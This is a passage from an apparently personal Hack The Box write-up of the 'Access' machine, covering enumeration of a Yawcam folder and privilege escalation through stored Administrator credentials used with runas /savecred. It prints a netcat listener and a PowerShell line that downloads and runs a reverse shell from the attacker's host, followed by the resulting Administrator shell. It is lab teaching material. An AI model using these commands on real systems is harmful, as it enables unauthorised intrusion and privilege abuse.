+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>USERPROFILE</span>\Desktop\user.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">97b894cf76e905009037bd3a086fc2c3
+</span></code></pre>
+<p>There's also a strange <code>.yawcam</code> folder... Let's see what it contains.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> dir <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>USERPROFILE</span>\.yawcam <span class="z-keyword z-operator z-assignment z-powershell">-</span>Force
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Mode                LastWriteTime     Length Name
+</span><span class="z-text z-plain">----                -------------     ------ ----
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            2
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            extravars
+</span><span class="z-text z-plain">d----         8/22/2018   7:49 AM            img
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            logs
+</span><span class="z-text z-plain">d----         8/22/2018   7:49 AM            motion
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            stream
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            tmp
+</span><span class="z-text z-plain">d----         8/23/2018  11:52 PM            www
+</span><span class="z-text z-plain">-a---         8/22/2018   7:49 AM          0 banlist.dat
+</span><span class="z-text z-plain">-a---         8/22/2018   7:49 AM          0 pass.dat
+</span><span class="z-text z-plain">-a---         8/23/2018  11:34 PM         82 ver.dat
+</span><span class="z-text z-plain">-a---         8/24/2018   8:37 PM       1411 yawcam_settings.xml
+</span></code></pre>
+<p>It looks like a folder for a software. Let's search online for this.</p>
+<blockquote>
+<p>Yawcam is short for Yet Another WebCAM software, and that's exactly what it is ;-)</p>
+<p>More precise Yawcam is a webcam software for Windows written in Java. The main ideas for Yawcam are to keep it simple and easy to use but to include all the usual features.</p>
+<p>— <a href="https://yawcam.com/">Yawcam</a></p>
+</blockquote>
+<p>That's interesting! Maybe it captured sensitive information... or maybe it's running an old version.</p>
+<h2 id="yawcam">Yawcam</h2>
+<h3 id="searching-for-files">Searching for files</h3>
+<p>I tried to search folders like <code>img</code>, <code>logs</code> or <code>motion</code> for files or images, but I found nothing.</p>
+<p>The <code>ver.dat</code> file contains interesting information though:</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>USERPROFILE</span>\.yawcam\ver.dat
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">0.6.2
+</span><span class="z-text z-plain">http://www.yawcam.com/ver.dat
+</span><span class="z-text z-plain">http://home.bitcom.se/yawcam_files/ver.dat
+</span></code></pre>
+<p>So Yawcam is using version <code>0.6.2</code>!</p>
+<h3 id="known-cves-1">Known CVEs</h3>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Yawcam</code>, we only find <a href="https://www.exploit-db.com/exploits/25487">yawcam 0.2.5 - Directory Traversal</a>. Our version of Yawcam probably isn't effected by it though, and perhaps it's not running as <code>NT AUTHORITY\SYSTEM</code>anyways...</p>
+<hr />
+<p>Back to our enumeration of home folders, we find something interesting in <code>C:\Users\Public\Desktop</code>:</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> dir C:\Users\Public\Desktop <span class="z-keyword z-operator z-assignment z-powershell">-</span>Force
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Mode                LastWriteTime     Length Name                                                                                                                                                                                          
+</span><span class="z-text z-plain">----                -------------     ------ ----                                                                                                                                                                                          
+</span><span class="z-text z-plain">-a-hs         7/14/2009   5:57 AM        174 desktop.ini                                                                                                                                                                                   
+</span><span class="z-text z-plain">-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk
+</span></code></pre>
+<p>The <code>ZKAccess3.5 Security System.lnk</code> is definitely unusual.</p>
+<h2 id="inspecting-c-users-public-desktop-zkaccess3-5-security-system-lnk">Inspecting <code>C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</code></h2>
+<p><code>.lnk</code> files are Windows shortcut files used by the OS to secure quick access to a certain file.</p>
+<p>Let's inspect it:</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-simple z-source z-powershell"><span class="z-support z-function z-powershell">New-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ComObject WScript.Shell</span><span class="z-punctuation z-section z-group z-end z-powershell">)</span>.CreateShortcut<span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-simple z-source z-powershell"><span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span></span><span class="z-punctuation z-section z-group z-end z-powershell">)</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">FullName         : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
+</span><span class="z-text z-plain">Arguments        : /user:ACCESS\Administrator /savecred &quot;C:\ZKTeco\ZKAccess3.5\Access.exe&quot;
+</span><span class="z-text z-plain">Description      : 
+</span><span class="z-text z-plain">Hotkey           : 
+</span><span class="z-text z-plain">IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0
+</span><span class="z-text z-plain">RelativePath     : 
+</span><span class="z-text z-plain">TargetPath       : C:\Windows\System32\runas.exe
+</span><span class="z-text z-plain">WindowStyle      : 1
+</span><span class="z-text z-plain">WorkingDirectory : C:\ZKTeco\ZKAccess3.5
+</span></code></pre>
+<p>Okay, so this shortcut file actually executes <code>/user:ACCESS\Administrator /savecred &quot;C:\ZKTeco\ZKAccess3.5\Access.exe&quot;</code>.</p>
+<p>There must be credentials stored in the credential manager for the <code>Administrator</code> user!</p>
+<h2 id="credential-manager">Credential manager</h2>
+<p>Let's check the credential manager for currently stored credentials.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> cmdkey <span class="z-keyword z-operator z-assignment z-powershell">/</span>list
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Currently stored credentials:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    Target: Domain:interactive=ACCESS\Administrator
+</span><span class="z-text z-plain">                                                       Type: Domain Password
+</span><span class="z-text z-plain">    User: ACCESS\Administrator
+</span></code></pre>
+<p>There are indeed some for the <code>Administrator</code> user!</p>
+<h1 id="privilege-escalation-stored-credentials">Privilege escalation (stored credentials)</h1>
+<p>On Windows, stored credentials refer to the user authentication information that is stored by the OS. These stored credentials are used to facilitate automatic logins and access to various resources without requiring the user to enter their username and password each time.</p>
+<p>We can abuse the stored credentials for the <code>Administrator</code> user to execute any command as <code>Administrator</code> using the <code>runas</code> utility with the <code>/savecred</code> option.</p>
+<h2 id="preparation">Preparation</h2>
+<p>Let's use these stored credentials to obtain a reverse shell as <code>Administrator</code>.</p>
+<p>To do so, I'll setup a listener on port <code>9001</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Then I'll choose the 'PowerShell #3 (Base64)' payload from <a href="https://www.revshells.com/">this website</a>, and I'll save it as <code>/workspace/server/revshell.ps1</code>.</p>
+<p>I'll transfer it to Access.</p>
+<p>Now we should be ready to go!</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Time to execute our reverse shell script as <code>Administrator</code>!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Users\security<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> runas <span class="z-keyword z-operator z-assignment z-powershell">/</span>user:ACCESS\Administrator <span class="z-keyword z-operator z-assignment z-powershell">/</span>savecred <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>powershell IEX((New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.4:8000/revshell2.ps1&#39;))<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<p>And on our listener...</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.98] 49158
+</span><span class="z-text z-plain">PS C:\Windows\system32&gt;
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<p>It's a standard one though, so I'll transform it into a Powershell session.</p>
+<p>If we run <code>whoami</code>, we can confirm that we are indeed <code>ACCESS\Administrator</code>.</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\Windows\system3<span class="z-keyword z-operator z-redirection z-powershell">2&gt;</span> type C:\Users\Administrator\Desktop\root.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1d389b23d004c0b9b8414aef3445a456
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/access/success.png" alt="Success" /></p>
+<p>That's it for this box! I found the foothold fairly easy to obtain, it just required a bit of research to properly open the files we found. The privilege escalation was also kinda easy, identifying it required a thorough enumeration, and exploiting it was simple.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
